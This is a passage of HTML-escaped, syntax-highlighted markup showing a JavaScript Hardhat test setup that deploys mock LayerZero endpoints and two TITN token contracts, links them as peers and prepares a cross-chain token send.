class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;MergeTgt\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;Tgt\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Fetching the first three signers (accounts) from Hardhat\u0026#39;s local Ethereum network\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esigners\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetSigners\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ;[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eendpointOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esigners\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// The EndpointV2Mock contract comes from @layerzerolabs/test-devtools-evm-hardhat package\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// and its artifacts are connected as external artifacts to this project\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eEndpointV2MockArtifact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeployments\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetArtifact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;EndpointV2Mock\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eEndpointV2Mock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eEndpointV2MockArtifact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabi\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eEndpointV2MockArtifact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytecode\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eendpointOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    })\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebeforeEach\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003easync\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploying a mock LZEndpoint with the given Endpoint ID\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockEndpointV2A\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eEndpointV2Mock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeidA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockEndpointV2B\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eEndpointV2Mock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeidB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploying two instances of the TITN contract with different identifiers and linking them to the mock LZEndpoint\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTitn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;baseTitn\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;baseTITN\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockEndpointV2A\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;1000000000\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        )\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTitn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;arbTitn\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;arbTITN\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockEndpointV2B\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseUnits\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        )\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Setting destination endpoints in the LZEndpoint mock for each TITN instance\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockEndpointV2A\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetDestLzEndpoint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockEndpointV2B\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockEndpointV2B\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetDestLzEndpoint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockEndpointV2A\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Setting each TITN instance as a peer of the other in the mock LZEndpoint\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetPeer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeidB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ezeroPad\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetPeer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeidA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ezeroPad\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Defining the amount of tokens to send and constructing the parameters for the send operation\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokensToSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseEther\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;173700000\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Defining extra message execution options for the send operation\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eoptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eOptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003enewOptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e().\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddExecutorLzReceiveOption\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e200000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoHex\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e().\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esendParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = [\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeidB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ezeroPad\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokensToSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokensToSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eoptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0x\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0x\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ]\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Fetching the native fee for the token send operation\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan 